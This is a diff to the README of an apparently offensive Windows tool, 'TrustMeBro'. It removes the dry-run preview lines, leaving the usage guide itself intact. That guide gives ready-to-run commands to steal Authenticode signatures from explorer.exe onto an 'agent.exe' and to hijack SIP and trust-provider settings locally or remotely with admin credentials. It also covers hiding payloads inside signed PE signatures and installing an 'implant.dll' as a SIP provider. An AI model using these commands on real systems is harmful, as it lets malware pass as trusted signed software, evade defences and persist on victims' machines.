@@ -50,7 +50,6 @@ TrustMeBro/
 
 ## C++ Usage
 
-Every subcommand supports `--dry-run` to preview without writing and `-v` for verbose output. Write operations print an undo hint on completion.
 
 ### steal
 
@@ -59,7 +58,6 @@ Steal signature and metadata from a donor PE. File operations only, no registry 
 ```cmd
 TrustMeBro.exe steal explorer.exe agent.exe
 TrustMeBro.exe steal explorer.exe agent.exe --clone
-TrustMeBro.exe steal explorer.exe agent.exe --dry-run
 ```
 
 After stealing, the signature will not validate until you run `hijack` or `--finalpolicy`.
@@ -98,7 +96,6 @@ TrustMeBro.exe hijack --finalpolicy --clean
 TrustMeBro.exe hijack --custom-provider {GUID} --clean
 
 :: Preview without writing
-TrustMeBro.exe hijack --sip-types all --dry-run
 ```
 
 ### embed
@@ -109,7 +106,6 @@ Embed payload into a signed PE's PKCS#7 signature. The Authenticode signature re
 TrustMeBro.exe embed payload.bin signed.exe output.exe
 TrustMeBro.exe embed payload.bin signed.exe output.exe --camouflage
 TrustMeBro.exe embed payload.bin signed.exe output.exe --oid 1.3.6.1.4.1.55555.1.1
-TrustMeBro.exe embed payload.bin signed.exe output.exe --dry-run
 ```
 
 ### extract
@@ -141,7 +137,6 @@ TrustMeBro.exe sip-exec --clean --guid pe
 TrustMeBro.exe sip-exec list
 
 :: Preview
-TrustMeBro.exe sip-exec install --dll C:\Temp\implant.dll --guid pe --dry-run
 ```
 
 ### probe
@@ -165,7 +160,6 @@ TrustMeBro.exe clean --sip
 TrustMeBro.exe clean --finalpolicy
 TrustMeBro.exe clean --custom-provider {GUID}
 TrustMeBro.exe clean --all
-TrustMeBro.exe clean --all --dry-run
 ```
 
 ---
@@ -187,7 +181,6 @@ pip install asn1crypto
 ```bash
 python3 TrustMeBro.py steal -s explorer.exe -t agent.exe
 python3 TrustMeBro.py steal -s explorer.exe -t agent.exe --clone
-python3 TrustMeBro.py steal -s explorer.exe -t agent.exe --dry-run
 ```
 
 ### hijack (remote)
@@ -225,7 +218,6 @@ python3 TrustMeBro.py hijack 192.168.1.10 -u Admin -p Pass --action finalpolicy-
 python3 TrustMeBro.py hijack 192.168.1.10 -u Admin -p Pass --action custom-provider-clean --provider-guid {GUID}
 
 # Preview
-python3 TrustMeBro.py hijack 192.168.1.10 -u Admin -p Pass --dry-run
 ```
 
 ### hijack (local)
